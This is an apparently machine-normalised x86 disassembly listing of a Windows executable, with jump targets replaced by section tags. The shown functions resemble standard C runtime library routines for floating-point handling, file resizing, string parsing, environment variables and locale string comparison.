mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi eax
and edi 0x1f
push 0x1
test al 0x8
pop ebx
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_40da24
pop ecx
and edi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_40da24
pop ecx
and edi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_40da24
pop ecx
mov eax 0xc00
mov ecx [ ebp + 0x10 ]
and ecx eax
je r-xdata
xor eax eax
test edi edi
pop edi
pop ebx
sete al
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
push esi
xor esi esi
test al 0x10
je r-xdata
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fcomp [ r--data ]
fld [ rw-data ]
fnstsw ax
sahf
ja r-xdata
cmp ecx 0x400
je r-xdata
push 0x20
call sub_40da24
pop ecx
and edi 0xffffffef
mov eax [ ebp + 0xc ]
fld [ eax ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fcomp [ r--data ]
fnstsw ax
sahf
je r-xdata
mov esi ebx
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
fchs
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
cmp ecx 0x800
je r-xdata
mov esi ebx
fld [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_40e059
mov eax [ ebp - 0x4 ]
add esp 0xc
fstp [ ebp - 0xc ]
lea ecx [ eax - 0x600 ]
cmp ecx 0xfffffbce
jge r-xdata
fld [ rw-data ]
fchs
fld [ rw-data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fcomp [ r--data ]
fnstsw ax
sahf
jbe r-xdata
cmp ecx eax
jne r-xdata
and edi 0xfffffffd
push 0x10
call sub_40da24
pop ecx
fld [ ebp - 0xc ]
fcomp [ r--data ]
fnstsw ax
sahf
jae r-xdata
fldz
mov esi ebx
fstp [ ebp - 0xc ]
jmp r-xdata
fstp [ ecx ]
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
jmp r-xdata
fld [ rw-data ]
fchs
fld [ rw-data ]
jmp r-xdata
and edi 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fcomp [ r--data ]
fld [ rw-data ]
fnstsw ax
sahf
ja r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fld [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
fstp [ eax ]
jmp r-xdata
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
jmp r-xdata
fstp [ ebp - 0xc ]
fld [ ebp - 0xc ]
jmp r-xdata
fchs
test edx edx
je r-xdata
sub eax ecx
mov al [ ebp - 0x6 ]
and eax 0xf
or al 0x10
mov [ ebp - 0x6 ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
test esi esi
pop esi
je r-xdata
fld [ ebp - 0xc ]
fchs
fstp [ ebp - 0xc ]
shr [ ebp - 0xc ] 0x1
test [ ebp - 0x8 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x8 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x9 ] 0x80
mov esi ebx
test [ ebp - 0xc ] bl
je r-xdata
sub_40da01
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx eax
and eax [ ebp + 0x8 ]
not ecx
and ecx [ ebp - 0x4 ]
or ecx eax
mov [ ebp + 0xc ] ecx
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_40da24
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_40da7a
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_40c879
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40db46
push ebp
mov ebp esp
mov eax 0x1000
call sub_40b3d0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ebx [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx * 8 + 0x4 ] 0x1
je r-xdata
push 0x1
push esi
push ebx
call sub_40aba4
add esp 0xc
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
or eax 0xffffffff
push 0x2
push esi
push ebx
call sub_40aba4
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
push 0x1000
lea eax [ ebp - 0x1000 ]
push esi
push eax
call sub_4043c0
push 0x8000
push ebx
call sub_40e11a
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp + 0x8 ]
push ebx
call sub_40aba4
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push ebx
call sub_40aba4
push ebx
call sub_40b5ec
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi 0xffffffff
jne r-xdata
push eax
lea eax [ ebp - 0x1000 ]
push eax
push ebx
call sub_409185
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
mov [ rw-data ] 0xd
call [ GetLastError@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
mov [ rw-data ] 0xd
push [ ebp + 0xc ]
push ebx
call sub_40e11a
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
mov eax 0x1000
cmp edi eax
jge r-xdata
sub_40dc8c
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_40dd17
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_40ab20
pop ecx
mov edi eax
call sub_40e203
test eax eax
jne r-xdata
push eax
call sub_40ab20
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_40e1c4
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40dd94
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov cx [ ebx + 0xa ]
xor eax eax
push edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov ax [ esi + 0xa ]
mov edi ecx
mov edx 0x7fff
xor edi eax
and eax edx
and ecx edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae r-xdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae r-xdata
cmp dx 0xbffd
ja r-xdata
cmp dx 0x3fbf
ja r-xdata
test ax ax
mov edx 0x7fffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc [ ebp + 0x8 ]
test [ esi + 0x8 ] edx
jne r-xdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne r-xdata
xor eax eax
cmp [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
add [ ebp - 0x4 ] 0x2
inc [ ebp - 0x10 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
add eax esi
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0x4 ] eax
jne r-xdata
cmp cx ax
jne r-xdata
cmp [ esi ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
add [ ebp - 0x8 ] 0x2
sub [ ebp - 0xc ] 0x2
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax ]
cmp [ ebx ] eax
jne r-xdata
jmp r-xdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
test [ ebp - 0x19 ] 0x80
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
imul eax ecx
mov ecx [ ebp - 0x4 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_40cac8
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0xa ] ax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x8000
ja r-xdata
movsx eax [ ebp + 0x8 ]
neg eax
add [ ebp + 0x8 ] eax
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40cb47
add [ ebp + 0x8 ] 0xffff
pop ecx
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ ebp - 0x22 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x24 ]
and eax 0x1ffff
cmp eax 0x18000
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40cb75
dec ebx
pop ecx
jne r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x22 ]
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x24 ] 0x1
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov cx [ ebp - 0x22 ]
or eax edi
mov [ esi ] cx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x6 ] ecx
inc [ ebp - 0x1e ]
jmp r-xdata
and [ ebp - 0x1e ] 0x0
cmp [ ebp - 0x1a ] 0xffff
jne r-xdata
or [ ebp - 0x24 ] 0x1
inc [ ebp - 0x1a ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1a ] 0x8000
jmp r-xdata
sub_40dfb4
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx rw-data
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
pop ebx
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ ebp + 0xc ]
mov ebx rw-data
neg eax
mov [ ebp + 0xc ] eax
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
cmp [ ebx + eax * 4 ] 0x8000
lea esi [ ebx + eax * 4 ]
jb r-xdata
mov eax [ ebp + 0xc ]
add ebx 0x54
sar [ ebp + 0xc ] 0x3
and eax 0x7
cmp eax ecx
je r-xdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_40dd94
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xa ]
lea esi [ ebp - 0xc ]
sub_40e030
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xe ]
fld [ ebp + 0x8 ]
add eax 0x3fe
and cx 0x800f
fstp [ ebp - 0x8 ]
shl eax 0x4
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_40e059
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
fcomp [ r--data ]
push esi
fnstsw ax
sahf
jne r-xdata
xor ecx ecx
test [ ebp + 0xe ] 0x7ff0
jne r-xdata
fldz
xor esi esi
fstp [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_40e030
mov eax [ ebp + 0xe ]
add esp 0xc
fstp [ ebp - 0x8 ]
shr eax 0x4
and ax 0x7ff
movsx esi ax
sub esi 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
fld [ ebp - 0x8 ]
mov [ eax ] esi
pop esi
leave
retn
fld [ ebp + 0x8 ]
fcomp [ r--data ]
mov esi 0xfffffc03
fnstsw ax
sahf
jae r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
push 0x1
pop eax
jmp r-xdata
and [ ebp + 0xe ] 0xffef
cmp eax ecx
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0xb ] 0x80
je r-xdata
test [ ebp + 0xe ] 0x10
jne r-xdata
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_40e030
fstp [ ebp - 0x8 ]
add esp 0xc
jmp r-xdata
or [ ebp + 0xf ] 0x80
shl [ ebp + 0x8 ] 0x1
dec esi
jmp r-xdata
or [ ebp + 0xc ] 0x1
sub_40e11a
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 8 + 0x4 ]
mov cl [ ecx + eax * 8 + 0x4 ]
test cl 0x1
je r-xdata
mov al cl
mov esi 0x8000
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
mov [ rw-data ] 0x16
jmp r-xdata
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
or eax 0xffffffff
pop esi
retn
sub_40e190
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40e1c4
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_40e271
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_40e203
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_4044f2
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_40e4ee
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_40e271
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_40ca9d
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_40ca9d
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_40b3d0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40b3d0
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_40e4ee
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_40e734
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_40e6cd
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_40e675
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_4044f2
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_40e203
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_406586
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_405bdc
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_406586
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_4044f2
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_40ab20
inc eax
inc eax
push eax
call sub_4044f2
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_40a890
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_405bdc
pop ecx
mov [ rw-data ] eax
sub_40e675
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_40e1c4
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_40e6cd
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_4044f2
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_404de5
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_40e7a7
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_40e734
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b250
pop ecx
pop ecx
pop ebp
retn
movzx edx ax
mov eax [ ebp + 0xc ]
sub eax edx
neg eax
sbb eax eax
not eax
and eax ecx
pop ebp
retn
movzx edx al
test [ edx + rw-data ] 0x4
je r-xdata
movzx edx ax
cmp [ ebp + 0xc ] edx
je r-xdata
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je r-xdata
inc ecx
jmp r-xdata
xor eax eax
pop ebp
retn
movzx eax ax
movzx edx dl
shl eax 0x8
or eax edx
cmp [ ebp + 0xc ] eax
je r-xdata
movzx ax [ ecx ]
test ax ax
je r-xdata
lea eax [ ecx - 0x1 ]
pop ebp
retn
jmp r-xdata
sub_40e7a7
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_40ab20
inc eax
push eax
call sub_4044f2
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_40a890
pop ecx
pop ecx
pop esi
retn
sub_401103
push esi
mov esi ecx
call sub_40111f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40427b
pop ecx
sub_40111f
push [ ecx + 0x8c ]
mov [ ecx ] r--data
